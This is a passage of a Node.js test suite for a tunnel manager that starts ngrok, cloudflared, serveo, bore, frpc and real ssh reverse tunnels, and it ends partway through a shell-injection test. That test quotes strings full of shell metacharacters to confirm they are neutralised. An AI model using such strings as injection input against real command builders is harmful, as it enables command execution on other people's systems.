import assert from "node:assert/strict";
import test, { after } from "node:test";
import { mkdtempSync, rmSync, readFileSync, writeFileSync, chmodSync, mkdirSync, existsSync } from "node:fs";
import { tmpdir, userInfo } from "node:os";
import { join } from "node:path";
import { execFileSync } from "node:child_process";
import { createServer as createHttpServer } from "node:http";
import { createServer as createNetServer } from "node:net";

async function loadSubject() {
  return import("../src/tunnels.ts");
}

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

/** Pick a free local port (kernel-assigned; released right after). */
function freePort() {
  return new Promise((resolve, reject) => {
    const s = createNetServer();
    s.once("error", reject);
    s.listen(0, "127.0.0.1", () => {
      const p = s.address().port;
      s.close(() => resolve(p));
    });
  });
}

/** Poll GET until the body matches (real forwarding check). */
async function httpGetUntil(url, expect, ms) {
  const dl = Date.now() + ms;
  let lastErr = "";
  while (Date.now() < dl) {
    try {
      const res = await fetch(url);
      const body = await res.text();
      if (body === expect) return body;
      lastErr = `body=${JSON.stringify(body)}`;
    } catch (err) {
      lastErr = String(err?.message ?? err);
    }
    await sleep(200);
  }
  throw new Error(`timeout waiting ${url} → ${expect} (${lastErr})`);
}

function tempDirs() {
  const base = mkdtempSync(join(tmpdir(), "st-tunnels-"));
  return { cacheDir: join(base, "cache"), base };
}

/**
 * 等待 ssh 隧道 URL 合成(注入 sshUrlSynthDelayMs=500 后秒级出现)。若 ssh 进程
 * 提前退出(并发时 sshd 偶发初始化失败 exit 255——系统级问题,单文件/手动连接均
 * 正常),自动 stop + restart 重试一次,吸收该偶发失败。返回合成 URL。
 */
async function waitSshUrl(tm, name, ms = 5_000, retries = 1) {
  for (let attempt = 0; ; attempt++) {
    const dl = Date.now() + ms;
    while (Date.now() < dl && !tm.get(name)?.url) await sleep(200);
    const url = tm.get(name)?.url;
    if (url) return url;
    const info = tm.get(name);
    const exited = !info?.running;
    if (exited && attempt < retries) {
      await tm.stop(name).catch(() => {});
      await tm.start(name);
      continue;
    }
    throw new Error(
      `no url for ${name} after ${attempt + 1} attempts: error=${info?.error}; running=${info?.running}; lastOutput=${JSON.stringify(info?.lastOutput)}`,
    );
  }
}

/** Build a fake tool binary that records its argv, prints a URL, then idles. */
function fakeTool(base, name, output) {
  const dir = join(base, "bin");
  mkdirSync(dir, { recursive: true });
  const bin = join(dir, name);
  // argv file is written BEFORE the URL line, so once a test sees the URL
  // parsed it can read the recorded args safely.
  writeFileSync(bin, `#!/bin/sh\nprintf '%s\\n' "$@" > '${dir}/args-${name}'\necho '${output}'\nsleep 60\n`, "utf8");
  chmodSync(bin, 0o755);
  return bin;
}

test("extractTunnelUrl: known domains win over unrelated links", async () => {
  const { extractTunnelUrl } = await loadSubject();
  assert.equal(extractTunnelUrl("Forwarding https://abc.ngrok.io -> http://localhost:30141"), "https://abc.ngrok.io");
  assert.equal(extractTunnelUrl("url=https://demo.ngrok-free.app session=..."), "https://demo.ngrok-free.app");
  assert.equal(extractTunnelUrl("started tunnel url=https://mammogram-outgoing-launch.ngrok-free.dev"), "https://mammogram-outgoing-launch.ngrok-free.dev");
  assert.equal(extractTunnelUrl("Forwarding HTTP traffic from https://abc-61-149-239-106.serveousercontent.com\n"), "https://abc-61-149-239-106.serveousercontent.com");
  assert.equal(extractTunnelUrl("https://xyz.trycloudflare.com created"), "https://xyz.trycloudflare.com");
  assert.equal(extractTunnelUrl("url: https://abc.loca.lt/"), "https://abc.loca.lt/");
  assert.equal(extractTunnelUrl("connecting to http://localhost:30141"), null);
  assert.equal(extractTunnelUrl("no url"), null);
  // known tunnel domain wins even when an official-site link comes first
  const mixed = "Terms: https://www.cloudflare.com/website-terms/ tunnel: https://real.trycloudflare.com";
  assert.equal(extractTunnelUrl(mixed), "https://real.trycloudflare.com");
});

test("lifecycle: start (tool resolved) → url parsed → stop (group kill)", { timeout: 20_000 }, async () => {
  const { TunnelManager } = await loadSubject();
  const { cacheDir, base } = tempDirs();
  try {
    fakeTool(base, "ngrok", "Forwarding https://demo.ngrok.io -> http://127.0.0.1:4180");
    const events = [];
    const tm = new TunnelManager({
      cacheDir,
      resolveTool: async (name) => join(base, "bin", name),
      onEvent: (e) => events.push(e),
    });
    tm.add({ name: "web", type: "ngrok", target: 4180 });

    const info = await tm.start("web");
    assert.equal(info.running, true);
    assert.ok(info.pid && info.pid > 0);
    assert.equal(events.some((e) => e.type === "start"), true);

    // wait for URL to be parsed from output
    const deadline = Date.now() + 5_000;
    while (Date.now() < deadline && !tm.get("web")?.url) {
      await new Promise((r) => setTimeout(r, 100));
    }
    assert.equal(tm.get("web")?.url, "https://demo.ngrok.io");
    assert.equal(events.some((e) => e.type === "url"), true);

    // persisted state contains pid + url
    const persisted = tm.persisted();
    assert.ok(persisted["web"], "persisted state");
    assert.equal(persisted["web"].url, "https://demo.ngrok.io");

    // stop kills the process group
    await tm.stop("web");
    const after = tm.get("web");
    assert.equal(after.running, false);
    assert.ok(events.some((e) => e.type === "stop"));
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("ssh: real user@localhost reverse tunnel — argv/forward/URL synthesis", { timeout: 200_000 }, async () => {
  // 真实本机 ssh 测试:ssh -R <remotePort>:127.0.0.1:<target> user@localhost。
  // 用户名取当前用户(os.userInfo().username)——不依赖任何 fake 脚本。
  // 验证:1) 真实 -R 转发把 sshd 侧端口导到本地 target 服务 2) URL 合成
  // http://localhost:<remotePort> 3) remotePort 默认 = target 4) 无 host 报错。
  // 固定高端口(42981+):freePort() 在并发测试下可能被立即复用导致 -R 绑定失败。
  const { TunnelManager } = await loadSubject();
  const { cacheDir, base } = tempDirs();
  const sshBin = execFileSync("which", ["ssh"], { encoding: "utf8" }).trim();
  const user = userInfo().username;
  const target = 42981;
  const server = createHttpServer((req, res) => res.end("SSH_FWD_OK"));
  await new Promise((r) => server.listen(target, "127.0.0.1", r));
  try {
    const tm = new TunnelManager({
      cacheDir,
      resolveTool: async (n) => (n === "ssh" ? sshBin : null),
      sshUrlSynthDelayMs: 500, // 本机 ssh 秒级就绪,无需等 ConnectTimeout 窗口
    });

    // full config: user@localhost + custom remotePort
    const remotePort = 42982;
    tm.add({ name: "my", type: "ssh", target, host: "localhost", user, remotePort });
    await tm.start("my");
    // URL 合成窗口 ~11s(ConnectTimeout 10s 之后才报 URL);sshd 偶发失败自动重启重试
    assert.equal(await waitSshUrl(tm, "my"), `http://localhost:${remotePort}`, "ssh -R 合成 URL (user@localhost)");
    assert.equal(tm.get("my")?.running, true);
    // 真实转发验证:请求 sshd 侧绑定的 remotePort 应到达 target 服务
    assert.equal(await httpGetUntil(`http://127.0.0.1:${remotePort}/`, "SSH_FWD_OK", 10_000), "SSH_FWD_OK", "ssh -R 真实转发到 target");
    await tm.stop("my");
    // 正常 stop:ssh 优雅退出(SIGTERM → exit 0)→ URL 保留(状态显示上次 URL 是设计);
    // 撤销只发生在非零退出(错误),见 "connection refused" 测试的 SIGKILL 场景。
    assert.equal(tm.get("my")?.running, false, "stop 后停止");
    assert.equal(tm.get("my")?.url, `http://localhost:${remotePort}`, "正常 stop 保留 URL(设计)");

    // remotePort 默认 = target(未设置时 -R target:127.0.0.1:target)
    const dTarget = 42983;
    const dServer = createHttpServer((req, res) => res.end("DEF_OK"));
    await new Promise((r) => dServer.listen(dTarget, "127.0.0.1", r));
    tm.add({ name: "def", type: "ssh", target: dTarget, host: "localhost", user });
    await tm.start("def");
    assert.equal(await waitSshUrl(tm, "def"), `http://localhost:${dTarget}`, "ssh: remotePort 默认 = target");
    assert.equal(await httpGetUntil(`http://127.0.0.1:${dTarget}/`, "DEF_OK", 10_000), "DEF_OK", "默认 remotePort 转发生效");
    await tm.stop("def");
    dServer.close();

    // ssh without host still errors clearly
    tm.add({ name: "bad", type: "ssh", target: 5000 });
    await assert.rejects(tm.start("bad"), /type "ssh" requires host/);
  } finally {
    server.close();
    rmSync(base, { recursive: true, force: true });
  }
});

test("serveo: builds ssh argv for the serveo.net hosted service", { timeout: 15_000 }, async () => {
  // serveo.net 是公网托管服务,本机无法真实连接(-R 80 由 serveo 服务端处理)。
  // ssh/serveo 的 bin 硬编码 "ssh"(走 PATH,不经 resolveTool),所以把记录 argv
  // 的替身 ssh 放到 PATH 前置;URL 从输出立即解析(serveo 无 11s 合成定时器)。
  const { TunnelManager } = await loadSubject();
  const { cacheDir, base } = tempDirs();
  const origPath = process.env.PATH;
  try {
    fakeTool(base, "ssh", "Forwarding HTTP traffic from https://abc.serveo.net");
    process.env.PATH = `${join(base, "bin")}:${process.env.PATH}`;
    const argvFile = join(base, "bin", "args-ssh");
    const tm = new TunnelManager({ cacheDir, resolveTool: async () => "" });
    tm.add({ name: "s", type: "serveo", target: 8901 });
    assert.equal(tm.get("s").type, "serveo", "serveo stays serveo (not aliased to ssh)");
    await tm.start("s");
    const dl = Date.now() + 5_000;
    while (Date.now() < dl && (!tm.get("s")?.url || !existsSync(argvFile))) await sleep(50);
    assert.equal(tm.get("s")?.url, "https://abc.serveo.net");
    const argv = readFileSync(argvFile, "utf8").trim().split("\n");
    assert.ok(argv.includes("-R"), "serveo: -R present");
    assert.equal(argv[argv.indexOf("-R") + 1], "80:127.0.0.1:8901", "serveo forwards remote port 80");
    assert.equal(argv[argv.length - 1], "serveo.net", "serveo dest is serveo.net");
    assert.ok(!argv.includes("-p"), "serveo: no -p when port unset");
    assert.ok(!argv.includes("-N"), "serveo: NO -N (URL is printed by serveo's forced session; -N suppresses it)");
    await tm.stop("s");
  } finally {
    process.env.PATH = origPath;
    rmSync(base, { recursive: true, force: true });
  }
});

test("start is idempotent; unknown tunnel throws", { timeout: 20_000 }, async () => {
  const { TunnelManager } = await loadSubject();
  const { cacheDir, base } = tempDirs();
  try {
    fakeTool(base, "cloudflared", "https://x.trycloudflare.com");
    const tm = new TunnelManager({ cacheDir, resolveTool: async (name) => join(base, "bin", name) });
    tm.add({ name: "cf", type: "cloudflared", target: 4180 });

    const first = await tm.start("cf");
    const second = await tm.start("cf"); // idempotent
    assert.equal(second.pid, first.pid);
    assert.equal(second.running, true);

    await assert.rejects(tm.start("missing"), /unknown tunnel/);
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("command type: shell command with URL output", { timeout: 20_000 }, async () => {
  const { TunnelManager } = await loadSubject();
  const { cacheDir, base } = tempDirs();
  try {
    const tm = new TunnelManager({ cacheDir, resolveTool: async () => "" });
    tm.add({ name: "legacy", type: "command", cmd: "echo 'tunnel url: https://abc.loca.lt/'; sleep 60" });
    const info = await tm.start("legacy");
    assert.equal(info.running, true);
    const deadline = Date.now() + 5_000;
    while (Date.now() < deadline && !tm.get("legacy")?.url) {
      await new Promise((r) => setTimeout(r, 100));
    }
    assert.equal(tm.get("legacy")?.url, "https://abc.loca.lt/");
    await tm.stop("legacy");
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("cloudflared: --edge pinned when SRV discovery is broken (env-forced)", async () => {
  const { TunnelManager, cloudflaredNeedsEdge, _resetCloudflaredEdgeCache } = await loadSubject();
  const { cacheDir, base } = tempDirs();
  const argsFile = join(base, "bin", "args-cloudflared");
  try {
    // Forced pin: argv must carry --edge region1.v2.argotunnel.com:7844.
    process.env.SERVICE_TUNNELS_CLOUDFLARED_EDGE = "1";
    _resetCloudflaredEdgeCache();
    assert.equal(await cloudflaredNeedsEdge(), true);
    fakeTool(base, "cloudflared", "https://c.trycloudflare.com");
    const tm = new TunnelManager({ cacheDir, resolveTool: async () => join(base, "bin", "cloudflared"), env: {} });
    tm.add({ name: "c", type: "cloudflared", target: 4180 });
    await tm.start("c");
    const deadline = Date.now() + 5_000;
    while (Date.now() < deadline && (!tm.get("c")?.url || !existsSync(argsFile))) {
      await new Promise((r) => setTimeout(r, 100));
    }
    assert.equal(tm.get("c")?.url, "https://c.trycloudflare.com");
    const argv = readFileSync(argsFile, "utf8").trim().split("\n");
    assert.ok(argv.includes("--edge"));
    assert.ok(argv.includes("region1.v2.argotunnel.com:7844"));
    assert.ok(argv.includes("--edge-ip-version"));
    await tm.stopAll();

    // Forced no-pin: argv must NOT carry --edge.
    process.env.SERVICE_TUNNELS_CLOUDFLARED_EDGE = "0";
    _resetCloudflaredEdgeCache();
    assert.equal(await cloudflaredNeedsEdge(), false);
    tm.add({ name: "c2", type: "cloudflared", target: 4180 });
    await tm.start("c2");
    const deadline2 = Date.now() + 5_000;
    while (Date.now() < deadline2 && (!tm.get("c2")?.url || !readFileSync(argsFile, "utf8").includes("tunnel"))) {
      await new Promise((r) => setTimeout(r, 100));
    }
    assert.equal(tm.get("c2")?.url, "https://c.trycloudflare.com");
    const argv2 = readFileSync(argsFile, "utf8").trim().split("\n");
    assert.ok(argv2.includes("tunnel"));
    assert.ok(!argv2.includes("--edge"));
    await tm.stopAll();
  } finally {
    delete process.env.SERVICE_TUNNELS_CLOUDFLARED_EDGE;
    _resetCloudflaredEdgeCache();
    rmSync(base, { recursive: true, force: true });
  }
});

test("buildCommand: ngrok/ssh/cloudflared/localtunnel argv shape", async () => {
  const { TunnelManager } = await loadSubject();
  const { cacheDir, base } = tempDirs();
  try {
    const tm = new TunnelManager({ cacheDir, resolveTool: async (name) => `/opt/${name}` });
    // exercise #build via start failure path is messy; instead verify through
    // a spy: spawn with a fake tool that records argv
    fakeTool(base, "ngrok", "https://n.ngrok.io");
    fakeTool(base, "cloudflared", "https://c.trycloudflare.com");
    fakeTool(base, "localtunnel", "https://l.loca.lt");
    const seen = [];
    const tm2 = new TunnelManager({
      cacheDir,
      resolveTool: async (name) => join(base, "bin", name),
      env: {},
      onEvent: (e) => seen.push(e),
    });
    tm2.add({ name: "n", type: "ngrok", target: 4180, domain: "fix.ngrok.app" });
    tm2.add({ name: "c", type: "cloudflared", target: 4180 });
    tm2.add({ name: "l", type: "localtunnel", target: 5173, domain: "myapp" });

    await tm2.start("n");
    await tm2.start("c");
    await tm2.start("l");
    // fake tools ignore args; assert they run + URLs parse
    const deadline = Date.now() + 5_000;
    while (Date.now() < deadline && (!tm2.get("n")?.url || !tm2.get("c")?.url || !tm2.get("l")?.url)) {
      await new Promise((r) => setTimeout(r, 100));
    }
    assert.equal(tm2.get("n")?.url, "https://n.ngrok.io");
    assert.equal(tm2.get("c")?.url, "https://c.trycloudflare.com");
    assert.equal(tm2.get("l")?.url, "https://l.loca.lt");
    await tm2.stopAll();
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("frpc: generates ini with server/token/domain and runs", { timeout: 20_000 }, async () => {
  const { TunnelManager } = await loadSubject();
  const { cacheDir, base } = tempDirs();
  try {
    const frpcScript = `#!/bin/sh
echo 'start frpc service success'
sleep 60
`;
    fakeTool(base, "frpc", "");
    writeFileSync(join(base, "bin", "frpc"), frpcScript, "utf8");
    chmodSync(join(base, "bin", "frpc"), 0o755);

    const tm = new TunnelManager({ cacheDir, resolveTool: async (name) => join(base, "bin", name) });
    tm.add({ name: "frp", type: "frpc", target: 4180, server: "1.2.3.4:7001", token: "sekret", domain: "app.example.com" });
    const info = await tm.start("frp");
    assert.equal(info.running, true);

    // ini file written with the right contents
    const iniPath = join(cacheDir, "tmp", "frpc-frp.ini");
    const ini = readFileSync(iniPath, "utf8");
    assert.match(ini, /server_addr = 1\.2\.3\.4/);
    assert.match(ini, /server_port = 7001/);
    assert.match(ini, /token = sekret/);
    assert.match(ini, /local_port = 4180/);
    assert.match(ini, /custom_domains = app\.example\.com/);
    await tm.stop("frp");
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("hydrate restores URLs from persisted state (restart scenario)", async () => {
  const { TunnelManager } = await loadSubject();
  const { cacheDir, base } = tempDirs();
  try {
    const tm = new TunnelManager({ cacheDir, resolveTool: async () => "" });
    tm.add({ name: "web", type: "ngrok", target: 4180 });
    tm.hydrate({ web: { pid: 12345, url: "https://old.ngrok.io" } });
    const info = tm.get("web");
    assert.equal(info.url, "https://old.ngrok.io");
    assert.equal(info.running, false); // process gone after restart
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("schemas: tunnel + auth provider param specs (data-driven forms)", async () => {
  const { tunnelParamSchema, tunnelParamSchemas } = await loadSubject();
  const all = tunnelParamSchemas();
  assert.deepEqual(Object.keys(all).sort(), ["bore", "cloudflared", "command", "frpc", "localtunnel", "natapp", "ngrok", "serveo", "ssh"]);
  const ssh = tunnelParamSchema("ssh");
  assert.ok(ssh.find((p) => p.key === "host")?.required, "ssh requires host");
  assert.equal(ssh.find((p) => p.key === "remotePort")?.type, "number");
  const bore = tunnelParamSchema("bore");
  assert.equal(bore.find((p) => p.key === "server")?.default, "localhost");
  assert.equal(bore.find((p) => p.key === "token")?.type, "password");
  assert.deepEqual(tunnelParamSchema("unknown-type"), []);

  const { authProviderSchemas } = await import("../src/auth-registry.ts");
  const cfgDir = mkdtempSync(join(tmpdir(), "st-schema-"));
  try {
    const auth = await authProviderSchemas(cfgDir);
    assert.ok(auth["oauth2-proxy"], "oauth2-proxy schema");
    assert.ok(auth["oauth2-proxy"].find((p) => p.key === "oidc.issuerUrl")?.required, "issuerUrl required");
    assert.ok(Array.isArray(auth.authelia));
    assert.deepEqual(auth.basic, [], "basic needs no params");
  } finally {
    rmSync(cfgDir, { recursive: true, force: true });
  }
});

test("applyParamSets: schema-driven CLI/form params (coerce + unknown-key errors)", async () => {
  const { tunnelParamSchema, applyParamSets, coerceParam } = await loadSubject();
  // bore: server string, remotePort number, token password
  const out = applyParamSets(tunnelParamSchema("bore"), { server: "tunnel.local", remotePort: "12001", token: "s3cret" }, "bore");
  assert.equal(out.server, "tunnel.local");
  assert.equal(out.remotePort, 12001, "number coerced");
  assert.equal(out.token, "s3cret");
  // unknown key → error listing valid keys
  assert.throws(() => applyParamSets(tunnelParamSchema("bore"), { bogus: "x" }, "bore"), /unknown param "bogus" \(valid: server, remotePort, token\)/);
  // number coercion failure
  assert.throws(() => applyParamSets(tunnelParamSchema("bore"), { remotePort: "abc" }, "bore"), /expects a number/);
  // booleans / raw strings
  assert.equal(coerceParam("1", { key: "x", type: "boolean" }), true);
  assert.equal(coerceParam("yes", { key: "x", type: "boolean" }), true);
  assert.equal(coerceParam("no", { key: "x", type: "boolean" }), false);
  assert.equal(coerceParam("hello", { key: "x" }), "hello");
});

test("bore: builds `bore local` argv + synthesizes url from 'listening at host:port'", { timeout: 20_000 }, async () => {
  const { TunnelManager, extractTunnelUrl } = await loadSubject();
  // bore prints no URL scheme — extractTunnelUrl prepends http://
  assert.equal(extractTunnelUrl("listening at localhost:53564", "bore"), "http://localhost:53564");
  assert.equal(extractTunnelUrl("listening at tunnel.example.com:443", "bore"), "http://tunnel.example.com:443");
  assert.equal(extractTunnelUrl("no listening line", "bore"), null);

  const { cacheDir, base } = tempDirs();
  try {
    const argvFile = join(base, "bore.argv");
    fakeTool(base, "bore", "");
    writeFileSync(
      join(base, "bin", "bore"),
      `#!/bin/sh\nprintf '%s\\n' "$@" > "${argvFile}"\necho 'listening at localhost:3999'\nsleep 60\n`,
      "utf8",
    );
    chmodSync(join(base, "bin", "bore"), 0o755);

    const tm = new TunnelManager({ cacheDir, resolveTool: async (n) => join(base, "bin", n) });
    tm.add({ name: "b", type: "bore", target: 4180, server: "tunnel.local:7835", token: "sek", remotePort: 5500 });
    await tm.start("b");
    const dl = Date.now() + 5_000;
    while (Date.now() < dl && !tm.get("b")?.url) await new Promise((r) => setTimeout(r, 50));
    assert.equal(tm.get("b")?.url, "http://localhost:3999");
    const argv = readFileSync(argvFile, "utf8").trim().split("\n");
    assert.equal(argv[0], "local");
    assert.equal(argv[1], "4180", "bore: local port = target");
    assert.equal(argv[argv.indexOf("--to") + 1], "tunnel.local:7835", "bore: --to <server>");
    assert.equal(argv[argv.indexOf("-p") + 1], "5500", "bore: -p <remotePort>");
    assert.equal(argv[argv.indexOf("-s") + 1], "sek", "bore: -s <secret>");
    await tm.stop("b");
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

test("ssh: real localhost tunnel synthesizes http://<host>:<remotePort>", { timeout: 120_000 }, async () => {
  // 真实本机 ssh(-R 到 user@localhost)验证 URL 合成 + 真实转发。固定端口避免
  // 并发 freePort 竞态导致 -R 绑定失败。
  const { TunnelManager } = await loadSubject();
  const { cacheDir, base } = tempDirs();
  const sshBin = execFileSync("which", ["ssh"], { encoding: "utf8" }).trim();
  const user = userInfo().username;
  const target = 42984;
  const server = createHttpServer((req, res) => res.end("SYNTH_OK"));
  await new Promise((r) => server.listen(target, "127.0.0.1", r));
  try {
    const tm = new TunnelManager({ cacheDir, resolveTool: async (n) => (n === "ssh" ? sshBin : null), sshUrlSynthDelayMs: 500 });
    const remotePort = 42985;
    tm.add({ name: "my", type: "ssh", target, host: "localhost", user, remotePort });
    const info = await tm.start("my");
    // 端点确定,但只在 ssh 存活过连接窗口后报 URL(11s);sshd 偶发失败自动重启重试
    assert.equal(await waitSshUrl(tm, "my"), `http://localhost:${remotePort}`, "ssh 合成 http://host:remotePort");
    assert.equal(tm.get("my")?.running, true);
    assert.ok(info.pid && info.pid > 0);
    // 真实转发:curl sshd 侧 remotePort 到达 target 服务
    assert.equal(await httpGetUntil(`http://127.0.0.1:${remotePort}/`, "SYNTH_OK", 10_000), "SYNTH_OK", "真实 -R 转发");
    await tm.stop("my");
  } finally {
    server.close();
    rmSync(base, { recursive: true, force: true });
  }
});

test("ssh: real connection refused does NOT report a URL; stop revokes it", { timeout: 150_000 }, async () => {
  // 真实 ssh 测试:1) 不可达(127.0.0.1 关闭端口 → Connection refused 立即退出)
  // → 无 URL + error;2) 可达(localhost)→ 合成 URL;3) stop 后退出非零 → 撤销 URL。
  const { TunnelManager } = await loadSubject();
  const { cacheDir, base } = tempDirs();
  const sshBin = execFileSync("which", ["ssh"], { encoding: "utf8" }).trim();
  const user = userInfo().username;
  const target = 42986;
  const server = createHttpServer((req, res) => res.end("UP"));
  await new Promise((r) => server.listen(target, "127.0.0.1", r));
  try {
    const tm = new TunnelManager({ cacheDir, resolveTool: async (n) => (n === "ssh" ? sshBin : null), sshUrlSynthDelayMs: 500 });

    // 1. unreachable: ssh 到未监听端口立即 Connection refused 退出
    tm.add({ name: "bad", type: "ssh", target, host: "127.0.0.1", port: 1, remotePort: 8080 });
    await tm.start("bad");
    await sleep(2_500); // ssh 立即退出;URL 永不合成
    const bad = tm.get("bad");
    assert.equal(bad.url, null, "不可达 → 不报 URL");
    assert.ok(bad.error, "不可达 → 报错");
    await tm.stop("bad");

    // 2. reachable: 真实 localhost 转发 → 合成 URL + 转发生效(sshd 偶发失败自动重试)
    const remotePort = 42987;
    tm.add({ name: "ok", type: "ssh", target, host: "localhost", user, remotePort });
    await tm.start("ok");
    assert.equal(await waitSshUrl(tm, "ok"), `http://localhost:${remotePort}`, "可达 → 合成 URL");
    assert.equal(await httpGetUntil(`http://127.0.0.1:${remotePort}/`, "UP", 10_000), "UP", "真实转发");

    // 3. 进程被强杀(SIGKILL → 非零退出)→ 撤销 URL(不报假成功)
    const killPort = 42988;
    tm.add({ name: "kill", type: "ssh", target, host: "localhost", user, remotePort: killPort });
    await tm.start("kill");
    assert.equal(await waitSshUrl(tm, "kill"), `http://localhost:${killPort}`, "隧道建立后 URL 合成");
    const killInfo = tm.get("kill");
    const killPid = killInfo?.pid;
    if (killPid) {
      try {
        process.kill(-killPid, "SIGKILL"); // 杀进程组,模拟崩溃
      } catch {
        process.kill(killPid, "SIGKILL");
      }
    }
    const dlRevoke = Date.now() + 5_000;
    while (Date.now() < dlRevoke && tm.get("kill")?.url) await sleep(100);
    const killed = tm.get("kill");
    assert.equal(killed.url, null, "非零退出 → URL 撤销(不报假成功)");
    assert.ok(killed.error, "非零退出 → error 记录");
    await tm.stopAll(); // 清理 ok + kill(force-exit 不留 detached 残留)
  } finally {
    server.close();
    rmSync(base, { recursive: true, force: true });
  }
});

test("auth registry: totpProviders 探测不含缓存毒化 (authelia 现在支持 TOTP)", async () => {
  const { createServiceTunnels } = await import("../src/index.ts");
  const { mkdtempSync } = await import("node:fs");
  const base = mkdtempSync(join(tmpdir(), "st-totp-"));
  try {
    const st = createServiceTunnels({ configDir: join(base, "cfg"), cacheDir: join(base, "cache"), guardian: false });
    // 探测不应缓存空 opts 实例: 之后 expose oauth2-proxy 必须仍收到 oidc
    const tp = st.auth.totpProviders();
    assert.ok(tp.includes("portal"), "portal 支持 TOTP");
    assert.ok(tp.includes("authelia"), "authelia 支持 TOTP (经 storage CLI)");
    const um = st.auth.userManagers();
    assert.ok(um.includes("basic") && um.includes("portal") && um.includes("authelia"));
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// Custom command tunnels — SERVICE_TUNNELS_TUNNEL_COMMAND_<NAME> env template
// ---------------------------------------------------------------------------

const CUSTOM_ENV = "SERVICE_TUNNELS_TUNNEL_COMMAND_sshbox";

function withCustomEnv(fn) {
  return async () => {
    process.env[CUSTOM_ENV] = "ssh -R {{port}}:127.0.0.1:{{localport}} user@host";
    try {
      await fn();
    } finally {
      delete process.env[CUSTOM_ENV];
    }
  };
}

test("custom command tunnel: env-registered type appears in schemas/tcp/meta", withCustomEnv(async () => {
  const { tunnelParamSchemas, tunnelParamSchema, tunnelMetas, tunnelMeta, tunnelSupportsTcp } = await loadSubject();
  // 出现在下拉框 schema 中,不 shadow 内置类型
  const all = tunnelParamSchemas();
  assert.ok(Object.keys(all).includes("sshbox"), "custom type in schemas");
  assert.deepEqual(Object.keys(all).sort(), ["bore", "cloudflared", "command", "frpc", "localtunnel", "natapp", "ngrok", "serveo", "ssh", "sshbox"]);
  // {{port}} → 必填;{{localport}} → 自动填充(不出现在表单)
  const specs = tunnelParamSchema("sshbox");
  assert.deepEqual(specs.map((s) => s.key), ["port"]);
  assert.equal(specs[0].required, true);
  // 用户显式注册 = 非危险类型(不会被客户端一键表单隐藏)
  assert.deepEqual(tunnelMetas().sshbox, {});
  assert.deepEqual(tunnelMeta("sshbox"), {});
  assert.deepEqual(tunnelMeta("command"), { dangerous: true });
  // tcp 假定支持(任意 shell 命令)
  assert.equal(tunnelSupportsTcp("sshbox"), true);
}));

test("custom command tunnel: {{token:default}} fixed params + invalid names skipped", async () => {
  const { tunnelParamSchema, tunnelParamSchemas } = await loadSubject();
  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_mybox = "echo {{host:localhost}}:{{port}} > {{out}}; sleep 60";
  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_ngrok = "echo shadow builtin"; // 内置名冲突 → 跳过
  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_ = "no name"; // 空名 → 跳过
  try {
    const specs = tunnelParamSchema("mybox");
    assert.deepEqual(specs.map((s) => s.key), ["host", "port", "out"]);
    assert.equal(specs[0].default, "localhost");
    assert.equal(specs[0].required, false);
    assert.equal(specs[1].required, true);
    assert.equal(specs[2].type, "string");
    // 内置名冲突 → 自定义模板被跳过,ngrok 仍是内置 schema(未被覆盖)
    const ngrok = tunnelParamSchema("ngrok");
    assert.ok(ngrok.some((s) => s.key === "domain"), "builtin ngrok schema intact (not shadowed)");
  } finally {
    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_mybox;
    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_ngrok;
    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_;
  }
});

test("custom command tunnel: resolveCustomCommand assembles + validation accepts", withCustomEnv(async () => {
  const { resolveCustomCommand } = await import("../src/tunnels-custom.ts");
  const cfg = { name: "x", type: "sshbox", target: 3000, port: 8080 };
  // 占位符值被单引号转义(字面量),模板字面量不转义
  assert.equal(
    resolveCustomCommand("sshbox", cfg),
    "ssh -R '8080':127.0.0.1:'3000' user@host",
  );
  // {{localport:PORT}} 固定值覆盖自动填充
  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_fixed = "ssh -R {{port}}:127.0.0.1:{{localport:9000}} u@h";
  try {
    const { resolveCustomCommand: rc2 } = await import("../src/tunnels-custom.ts");
    assert.equal(rc2("fixed", { name: "f", type: "fixed", target: 3000, port: 8080 }), "ssh -R '8080':127.0.0.1:'9000' u@h");
  } finally {
    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_fixed;
  }
  // 缺失必填参数 → 明确报错
  assert.throws(
    () => resolveCustomCommand("sshbox", { name: "x", type: "sshbox", target: 3000 }),
    /missing required parameter "\{\{port\}\}"/,
  );
  // 大小写不敏感:{{RemotePort}} 命中 cfg.remotePort
  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_case = "ssh -R {{RemotePort}}:127.0.0.1:{{localport}} u@h";
  try {
    const { resolveCustomCommand: rc3 } = await import("../src/tunnels-custom.ts");
    assert.equal(rc3("case", { name: "c", type: "case", target: 3000, remotePort: 5555 }), "ssh -R '5555':127.0.0.1:'3000' u@h");
  } finally {
    delete process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_case;
  }
  // validateTunnelConfig 接受自定义类型
  const { validateTunnelConfig } = await import("../src/validation.ts");
  validateTunnelConfig(cfg);
  assert.throws(() => validateTunnelConfig({ name: "x", type: "totally-unknown", target: 3000 }), /unsupported tunnel type/);
}));

test("custom command tunnel: shell injection is neutralised (values single-quoted)", async () => {
  const { resolveCustomCommand, shellQuote } = await import("../src/tunnels-custom.ts");
  // 引号转义单元:单引号按 POSIX 规则转义
  assert.equal(shellQuote("O'Brien"), "'O'\\''Brien'");
  assert.equal(shellQuote("a b;c|d&e`f$g\"h"), "'a b;c|d&e`f$g\"h'");
  // 注入尝试:值整体成为单个字面量参数,无法逃出
  process.env.SERVICE_TUNNELS_TUNNEL_COMMAND_inj = "ssh -R {{port}}:127.0.0.1:{{localport}} u@h";
  try {
    const { resolveCustomCommand: rc } = await import("../src/tunnels-custom.ts");
